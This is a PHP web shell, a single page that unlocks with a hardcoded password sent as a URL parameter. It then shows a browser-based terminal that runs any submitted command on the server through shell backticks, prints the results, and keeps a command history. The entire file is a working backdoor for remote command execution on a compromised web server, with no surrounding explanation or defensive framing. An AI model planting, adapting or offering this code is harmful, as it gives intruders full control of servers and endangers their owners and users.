<?php

$auth = false;
if(isset($_GET['password']) && $_GET['password']=='imbwa') {
    $auth = true;
}
$format = `echo $(whoami)@$(hostname):$(pwd)`;
$format .= '# ';

if($auth && isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $result = `$cmd`;
}
?>
<style>
    input:focus{
        outline: 0px;
    }
    #result {
        font-family: 'Courier New', Courier, monospace;
    }
</style>
<?php if(!$auth) { ?>
    <form method='GET'>
        Password: <input type='password' name='password' />
        <button>Send</button>
    </form>
<?php } ?>
<?php if($auth) { ?>
<form method='POST' onsubmit='runCommand(event)'>
<div style='background: black; padding: 5px; color: white;'>
    <div id='result'>
        <div><?php if(isset($cmd))echo $format.$cmd; ?></div>
        <div style='white-space: pre;'><?echo nl2br($result); ?></div>
    </div>
    <?php echo $format.$cmd; ?><input style='border-width: 0px; background: black; color: white; ' onkeyup='runHistory(event)' name="cmd" autofocus />
</div>
</form>
<script>
    var topResultElement = document.querySelector('#result');
    var cmdHistory = [];
    var current = 0;
    var cmdInput = document.querySelector('[name=cmd]');
    function runCommand(e){
        e.preventDefault();
        fetch('', {
            method: 'POST',
            body: new FormData(e.target),
        }).then(response=>response.text()).then(function(result){
            cmdHistory.push(cmdInput.value);
            current = cmdHistory.length;
            cmdInput.value = '';
            var parser = new DOMParser();
            var responseElement = parser.parseFromString(result, 'text/html');
            var resultElement = responseElement.querySelector('#result');
            console.log(resultElement.innerHTML);
            topResultElement.innerHTML += resultElement.innerHTML;
            
        });
    }
    function runHistory(e) {
        console.log('Key', e.key);
        if(e.key=='ArrowUp') {
            if(current > 0) {
               cmdInput.value = cmdHistory[--current];
            }
        }
        if(e.key=='ArrowDown') {
            if(current < cmdHistory.length) {
               cmdInput.value = cmdHistory[++current] ?? '';
            }
        }
    }
</script>
<?php } ?>